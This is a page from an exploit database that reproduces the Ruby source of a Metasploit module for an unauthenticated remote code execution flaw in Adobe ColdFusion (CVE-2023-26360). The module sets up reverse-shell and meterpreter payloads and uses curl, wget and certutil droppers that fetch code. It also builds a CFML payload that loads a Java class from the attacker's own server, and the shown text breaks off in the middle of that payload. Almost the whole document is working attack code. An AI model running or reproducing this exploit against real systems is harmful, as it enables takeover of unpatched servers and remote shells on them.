---
title: Adobe ColdFusion Unauthenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023050011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-04
fetch_date: 2025-10-04T11:36:41.407125
---

# Adobe ColdFusion Unauthenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Adobe ColdFusion Unauthenticated Remote Code Execution** **2023.05.03**  Credit:  **[sf](https://cxsecurity.com/author/sf/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::HttpServer::HTML
include Msf::Exploit::CmdStager
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Adobe ColdFusion Unauthenticated Remote Code Execution',
'Description' => %q{
This module exploits a remote unauthenticated deserialization of untrusted data vulnerability in Adobe
ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier, in
order to gain remote code execution.
},
'License' => MSF\_LICENSE,
'Author' => [
'sf', # MSF Exploit & Rapid7 Analysis
],
'References' => [
['CVE', '2023-26360'],
['URL', 'https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360/rapid7-analysis']
],
'DisclosureDate' => '2023-03-14',
'Platform' => %w[java win linux unix],
'Arch' => [ARCH\_JAVA, ARCH\_CMD, ARCH\_X86, ARCH\_X64],
'Privileged' => true, # Code execution as 'NT AUTHORITY\SYSTEM' on Windows and 'nobody' on Linux.
'WfsDelay' => 30,
'Targets' => [
[
'Generic Java',
{
'Type' => :java,
'Platform' => 'java',
'Arch' => [ ARCH\_JAVA ],
'DefaultOptions' => {
'PAYLOAD' => 'java/meterpreter/reverse\_tcp'
}
},
],
[
'Windows Command',
{
'Type' => :cmd,
'Platform' => 'win',
'Arch' => ARCH\_CMD,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/windows/powershell\_reverse\_tcp'
}
},
],
[
'Windows Dropper',
{
'Type' => :dropper,
'Platform' => 'win',
'Arch' => [ ARCH\_X86, ARCH\_X64 ],
'CmdStagerFlavor' => [ 'certutil', 'psh\_invokewebrequest' ],
'DefaultOptions' => {
'PAYLOAD' => 'windows/x64/meterpreter/reverse\_tcp'
}
}
],
[
'Unix Command',
{
'Type' => :cmd,
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/reverse\_perl'
}
},
],
[
'Linux Dropper',
{
'Type' => :dropper,
'Platform' => 'linux',
'Arch' => [ARCH\_X64],
'CmdStagerFlavor' => [ 'curl', 'wget', 'bourne', 'printf' ],
'DefaultOptions' => {
'PAYLOAD' => 'linux/x64/meterpreter/reverse\_tcp'
}
}
],
],
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [
# The following artifacts will be left on disk:
# The compiled CFML class generated from the poisoned coldfusion-out.log (Note: the hash number will vary)
# \* Windows: C:\ColdFusion2021\cfusion\wwwroot\WEB-INF\cfclasses\cfcoldfusion2dout2elog376354580.class
# \* Linux: /opt/ColdFusion2021/cfusion/wwwroot/WEB-INF/cfclasses/cfcoldfusion2dout2elog181815836.class
# If a dropper payload was used, a file with a random name may be left.
# \* Windows: C:\Windows\Temp\XXXXXX.exe
# \* Linux: /tmp/XXXXXX
ARTIFACTS\_ON\_DISK,
# The following logs will contain IOCs:
# C:\ColdFusion2021\cfusion\logs\coldfusion-out.log
# C:\ColdFusion2021\cfusion\logs\exception.log
# C:\ColdFusion2021\cfusion\logs\application.log
IOC\_IN\_LOGS
],
'RelatedModules' => [
'auxiliary/gather/adobe\_coldfusion\_fileread\_cve\_2023\_26360'
]
}
)
)
register\_options(
[
Opt::RPORT(8500),
OptString.new('URIPATH', [false, 'The URI to use for this exploit', '/']),
OptString.new('CFC\_ENDPOINT', [true, 'The target ColdFusion Component (CFC) endpoint', '/cf\_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc']),
OptString.new('CF\_LOGFILE', [true, 'The target log file, relative to the wwwroot folder.', '../logs/coldfusion-out.log'])
]
)
end
def check
res = send\_request\_cgi(
'method' => 'GET',
'uri' => '/'
)
return CheckCode::Unknown('Connection failed') unless res
# We cannot identify the ColdFusion version through a generic technique. Instead we use the Recog fingerprint
# to match a ColdFusion cookie, and use this information to detect ColdFusion as being present.
# https://github.com/rapid7/recog/blob/main/xml/http\_cookies.xml#L69
if res.get\_cookies =~ /(CFCLIENT\_[^=]+|CFGLOBALS|CFID|CFTOKEN)=|.cfusion/
return CheckCode::Detected('ColdFusion detected but version number is unknown.')
end
CheckCode::Unknown
end
def exploit
unless datastore['CFC\_ENDPOINT'].end\_with?('.cfc')
fail\_with(Failure::BadConfig, 'The CFC\_ENDPOINT must point to a .cfc file')
end
case target['Type']
when :java
# Start the HTTP server
start\_service
# Trigger a loadClass request via java.net.URLClassLoader
trigger\_urlclassloader
# Handle the payload...
handler
when :cmd
execute\_command(payload.encoded)
when :dropper
execute\_cmdstager
end
end
def on\_request\_uri(cli, \_req)
if target['Type'] == :java
print\_status('Received payload request, transmitting payload jar...')
send\_response(cli, payload.encoded, {
'Content-Type' => 'application/java-archive',
'Connection' => 'close',
'Pragma' => 'no-cache'
})
else
super
end
end
def trigger\_urlclassloader
# Here we construct a CFML payload to load a Java payload via URLClassLoader.
# NOTE: If our URL ends with / a XXX.class is loaded, if no trailing slash then a JAR is expected to be returned.
cf\_url = Rex::Text.rand\_text\_alpha\_lower(4)
srvhost = datastore['SRVHOST']
# Ensure SRVHOST is a routable IP address to our RHOST.
if Rex::Socket.addr\_atoi(srvhost) == 0
srvhost = Rex::Socket.source\_address(rhost)
end
# Create a URL pointing back to our HTTP server.
cfc\_payload = "<cfset #{cf\_url} = createObject('java','java.net.URL').init('http://#{srvhost}:#{datastore['SRVPORT']}')/>"
cf\_reflectarray = Rex::Text.rand\_text\_alpha\_lower(4)
# Get a reference to java.lang.reflect.Array so we can create a URL[] instance.
cfc\_payload << "<cfset #{cf\_reflectarray} = createObject('java','java.lang.reflect.Array')/>"
cf\_array = Rex::Text.rand\_text\_alpha\_lower(4)
# Create a URL[1] instance.
cfc\_payload << "<cfset #{cf\_array} = #{cf\_reflectarray}.newInstance(#{cf\_url}.getClass(),1)/>"
# Set the first element in the array to our URL.
cfc\_payload << "<cfset #{cf\_reflectarray}.set(#{c...